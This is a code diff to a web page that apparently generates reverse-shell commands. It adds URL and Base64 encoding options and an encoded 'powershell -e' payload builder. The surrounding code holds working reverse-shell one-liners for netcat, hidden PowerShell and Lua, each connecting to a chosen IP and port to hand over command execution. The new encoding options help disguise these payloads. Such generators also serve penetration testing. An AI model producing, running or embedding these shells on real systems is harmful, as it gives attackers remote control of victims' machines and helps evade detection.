@@ -53,25 +53,54 @@
         <a href="#" onclick="activateAdvanced(); return false">Advanced &hellip;</a>
     </div>
 
-    <form id="advanced-settings" class="form-inline justify-content-center mt-2 mb-5" style="display: none">
-        <label for="shell" class="mr-2">Shell:</label>
-        <select class="custom-select" id="shell" onchange="update()">
-            <option selected>sh</option>
-            <option>bash</option>
-            <option>ash</option>
-            <option>bsh</option>
-            <option>csh</option>
-            <option>ksh</option>
-            <option>zsh</option>
-            <option>pdksh</option>
-            <option>tcsh</option>
-        </select>
+    <div id="advanced-settings" class="row justify-content-center mt-2 mb-5" style="display: none">
+        <form class="col-auto form-inline align-content-start">
+            <label for="shell" class="mr-2">Shell:</label>
+            <select class="custom-select" id="shell" onchange="update()">
+                <option selected>sh</option>
+                <option>bash</option>
+                <option>ash</option>
+                <option>bsh</option>
+                <option>csh</option>
+                <option>ksh</option>
+                <option>zsh</option>
+                <option>pdksh</option>
+                <option>tcsh</option>
+            </select>
 
-        <div class="custom-control custom-switch ml-4">
-            <input type="checkbox" class="custom-control-input" id="auto-copy-switch">
-            <label class="custom-control-label" for="auto-copy-switch">Auto-copy to clipboard</label>
-        </div>
-    </form>
+            <div class="custom-control custom-switch ml-4">
+                <input type="checkbox" class="custom-control-input" id="auto-copy-switch">
+                <label class="custom-control-label" for="auto-copy-switch">Auto-copy to clipboard</label>
+            </div>
+        </form>
+        <form class="col-auto row ml-3">
+            <div class="col pr-0" style="margin-top: 7px">
+                Encoding:
+            </div>
+            <div class="col">
+                <div class="custom-control custom-radio">
+                    <input type="radio" id="no-encoding-radio" name="encoding-radio" class="custom-control-input"
+                           checked onchange="update()">
+                    <label class="custom-control-label" for="no-encoding-radio">None</label>
+                </div>
+                <div class="custom-control custom-radio">
+                    <input type="radio" id="encodeuri-radio" name="encoding-radio" class="custom-control-input"
+                           onchange="update()">
+                    <label class="custom-control-label" for="encodeuri-radio">encodeURI</label>
+                </div>
+                <div class="custom-control custom-radio">
+                    <input type="radio" id="encodeuricomponent-radio" name="encoding-radio"
+                           class="custom-control-input" onchange="update()">
+                    <label class="custom-control-label" for="encodeuricomponent-radio">encodeURIComponent</label>
+                </div>
+                <div class="custom-control custom-radio">
+                    <input type="radio" id="base64-radio" name="encoding-radio" class="custom-control-input"
+                           onchange="update()">
+                    <label class="custom-control-label" for="base64-radio">Base64</label>
+                </div>
+            </div>
+        </form>
+    </div>
 
     <div class="row flex-grow-1 overflow-hidden mb-5 h-100">
         <div class="col-12 col-md-3 d-flex flex-column h-100">
@@ -85,7 +114,7 @@
                     Copy
                 </button>
                 <pre id="command" class="bg-light text-wrap text-break w-100 p-4 mb-0"
-                     style="padding-right: 5em !important; outline: 0 solid transparent;" contenteditable="true"></pre>
+                     style="padding-right: 5em !important; outline: 0 solid transparent" contenteditable="true"></pre>
             </div>
         </div>
     </div>
@@ -110,6 +139,7 @@
         'Netcat #2': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/{shell} -i 2>&1|nc {ip} {port} >/tmp/f',
         'PowerShell #1': 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
         'PowerShell #2': 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',
+        'PowerShell #3 (Base64)': null,
         'Lua': 'lua5.1 -e \'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\''
 
     }
@@ -123,13 +153,32 @@
             if (el.innerText === currentCommandName) el.classList.add('active')
         })
 
+        var encoding = document.getElementById('encodeuri-radio').checked ? 'encodeURI' :
+            document.getElementById('encodeuricomponent-radio').checked ? 'encodeURIComponent' :
+                document.getElementById('base64-radio').checked ? 'Base64' : 'None'
         var ip = document.getElementById('ip').value || document.getElementById('ip').placeholder
         var port = document.getElementById('port').value || document.getElementById('port').placeholder
         var shell = document.getElementById('shell').value
         var command = shells[currentCommandName]
-            .replace('{ip}', '<span class="user-parameter">' + ip + '</span>')
-            .replace('{port}', '<span class="user-parameter">' + port + '</span>')
-            .replace('{shell}', '<span class="user-parameter">' + shell + '</span>')
+
+        if (currentCommandName === 'PowerShell #3 (Base64)') {
+            var payload = '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+            command = "powershell -e " + btoa(payload.replace('{ip}', ip).replace('{port}', port))
+        }
+
+        if (encoding === 'Base64') {
+            command = btoa(command)
+        } else {
+            var encode = function (string) {
+                if (encoding === 'encodeURI') return encodeURI(string)
+                if (encoding === 'encodeURIComponent') return encodeURIComponent(string)
+                return string
+            }
+            command = encode(command)
+                .replace(encode('{ip}'), '<span class="user-parameter">' + ip + '</span>')
+                .replace(encode('{port}'), '<span class="user-parameter">' + port + '</span>')
+                .replace(encode('{shell}'), '<span class="user-parameter">' + shell + '</span>')
+        }
         document.getElementById('command').innerHTML = command
     }
 
@@ -163,7 +212,7 @@
                 }
                 return false
             }
-            document.getElementById('clickable-list').appendChild(listEntry)
+            document.getElementById('list-of-commands').appendChild(listEntry)
         })
 
         currentCommandName = 'Bash #1'
